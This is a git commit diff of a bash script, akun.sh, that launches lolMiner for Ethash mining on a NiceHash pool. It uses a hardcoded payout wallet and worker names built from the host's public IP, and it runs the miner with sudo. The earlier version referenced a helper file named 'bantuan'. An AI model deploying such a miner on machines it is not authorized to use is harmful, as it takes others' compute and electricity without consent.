1a8f69889331fcc9c7eeff70c0b897ed4225bb10
angkii <83603708+angkii@users.noreply.github.com>
2021-08-18 22:00:43 +0700

    Update akun.sh

--- akun.sh
+++ akun.sh
@@ -1,7 +1,11 @@
 #!/bin/bash
-POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
-WALLET=3BsJ6cvtviyvS6tWfFWaDGHStB8pTHUrNH
-WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 
-chmod +x bantuan
-./lolMiner --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+POOL=stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353
+
+WALLET=3CLwMhAfkjUMCjiTqj18DvE3XLui54kjwM
+
+WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH
+
+cd "$(dirname "$0")"
+
+chmod +x ./lolMiner && sudo ./lolMiner --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHPROXY
